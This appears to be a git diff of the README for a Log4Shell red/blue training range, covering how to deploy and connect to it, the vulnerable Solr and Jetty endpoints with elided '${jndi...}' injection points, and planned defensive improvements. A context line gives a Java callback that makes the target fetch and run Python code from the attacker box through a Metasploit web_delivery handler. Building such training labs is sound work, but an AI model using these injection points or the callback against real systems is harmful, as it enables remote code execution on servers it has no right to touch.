@@ -1,3 +1,47 @@
+# Deploying the Range
+
+First, deploy the infrastructure.  Check out `terraform/README.md`.
+
+Then, configure it.  Check out `ansible/README.md`.
+
+# Connecting to the Range
+
+A Guacamole server will be available at the domain you setup when deploying the infrastructure.  It'll even have a nice Let's Encrypt cert, so hit it at https.
+
+Alternatively, you can SSH into the hosts.  If you're in the ansible directory you can run something like the following to SSH to them through the jump host:
+
+`eval $(../scripts/get_ssh_cmd.py "kali_host_01")`
+
+That host name comes from the Ansible hosts file - the `get_ssh_cmd.py` builds an SSH command based on the host info...
+
+![Network Map](log4j_range_diagram.png)
+
+# Vulnerable Services
+
+After deploying the range and connecting, you'll have a couple vulnerable services at your disposal.
+
+## Solr
+
+`http://{solr-addr}:8983/solr/admin/cores?anything=${jndi...}`
+
+`http://{solr-addr}:8983/solr/admin/configs?anything=${jndi...}`
+
+`http://{solr-addr}:8983/solr/admin/collections?anything=${jndi...}`
+
+This project uses Solr version 8.8.0 from Docker Hub.  The version of Java is new enough that it requires a system property be misconfigured to work...  It needs `com.sun.jndi.ldap.object.trustURLCodebase=true`.
+
+## Jetty
+
+`http://{solr-addr}/?q=${jndi...}`
+
+`curl -H "User-Agent: ${jndi...}"`
+
+This project uses the vulnerable Jetty server included via [this project](https://github.com/kc0bfv/vulnerableJettyLog4Shell)
+
+# Exploiting Log4J
+
+The Kali box's Desktop README has some tips in it, and the address of the vulnerable server.  First, you'll want to nmap it to make sure you understand what you're going after.  Then you might hit the services in your browser to learn a little more...  After that, setup a callback server and send the exploit.
+
 # Setting up a Callback Server
 
 First - thank you to SANS who I stole this from.  https://gist.github.com/joswr1ght/fb361f1f1e58307048aae5c0f38701e4
@@ -39,25 +83,10 @@ Now you've got three listeners setup.  Next you're going to send the message to 
 
 You can also call back to a metasploit `web_delivery` handler by using a Log4JCallback that runs something like: `java.lang.Runtime.getRuntime().exec(new String[] {"python3", "-c", "import urllib.request; exec(urllib.request.urlopen('http://{kali_box_ip}:8080/{MSFending}').read())"});`
 
-# Vulnerable Services
-
-## Solr
-
-`http://{solr-addr}:8983/solr/admin/cores?anything=${jndi...}`
-
-`http://{solr-addr}:8983/solr/admin/configs?anything=${jndi...}`
-
-`http://{solr-addr}:8983/solr/admin/collections?anything=${jndi...}`
-
-## Jetty
-
-`http://{solr-addr}/?q=${jndi...}`
-
-`curl -H "User-Agent: ${jndi...}"`
-
 # Improvements Needed
 
 For defense:
 
 1. Blue team routing is too tied in with the red team.  They are both in the same VPC so the subnets default to allowing all connections to/from everywhere...  Putting blue and red in separate VPCs with peering rules between them might allow a more real-world division.
 2. Blue team needs a security onion box so they can monitor what's going on.  This may require a specific routing device in the infrastructure too.  The security onion monitoring can get attached to capture all the info headed to a routing device interface.
+3. I have no idea how this meets or fails to meet security standards that might be required at my workplace.
